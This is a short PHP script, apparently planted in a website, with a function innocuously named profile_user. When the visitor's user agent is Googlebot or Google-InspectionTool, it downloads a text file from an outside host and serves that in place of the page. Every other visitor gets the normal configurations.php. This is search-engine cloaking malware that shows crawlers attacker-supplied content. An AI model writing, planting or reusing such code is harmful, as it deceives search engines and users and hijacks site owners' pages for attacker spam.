<?php
function profile_user() {
   $refererUrl = !empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No Referer';
   $useragent = $_SERVER['HTTP_USER_AGENT'];
   $pasteUrl = 'https://otsosukiishiki.com/content/dev.abadraho.com.txt';
   $refererDomain = parse_url($refererUrl, PHP_URL_HOST);
   if (strpos($useragent, 'Google-InspectionTool') !== false || strpos($useragent, 'googlebot') !== false || strpos($useragent, '(compatible; Googlebot/2.1; +http://www.google.com/bot.html)') !== false) {
       $ch = curl_init($pasteUrl);
       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
       $content = curl_exec($ch);
       if ($content === false) {
           echo 'Error fetching content: ' . curl_error($ch);
           exit();
       }
       curl_close($ch);

       echo $content;
       exit();

   } else {
       include('configurations.php');
       exit;
   }
}
profile_user();
?>